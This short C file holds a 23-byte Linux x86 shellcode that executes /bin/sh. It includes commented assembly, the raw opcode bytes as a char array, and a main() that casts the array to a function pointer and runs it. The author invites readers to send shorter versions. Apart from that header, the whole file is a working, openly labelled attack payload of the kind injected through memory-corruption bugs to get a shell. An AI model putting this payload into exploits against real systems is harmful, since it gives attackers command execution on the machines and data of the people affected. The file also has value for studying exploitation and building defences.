/*
	generic execve() /bin/sh, 23 bytes
	by sd@cdi.cz, if you can make it _shorter_ than 23 bytes, please
	send me changes.

	xor	%eax,%eax
	push	%eax
	.byte	0x68		# "//bin/sh", 0 to stack
	.ascii	"n/sh"
	.byte	0x68
	.ascii	"//bi"
	mov    %esp,%ebx	# first ptr to binary
	push   %eax		# eax == 0
	push   %ebx		# ptr to our binary ptr
	mov    %esp,%ecx
	mov    $0xb,%al
	int    $0x80		# exec it! :)
*/


unsigned char sc[] =
	"\x31\xc0\x50\x68\x6e\x2f\x73\x68"
	"\x68\x2f\x2f\x62\x69\x89\xe3\x50"
	"\x53\x89\xe1\xb0\x0b\xcd\x80";

int	main()
{
	void		(*execme)() = (void *) sc;
	execme();
	return 0;
}
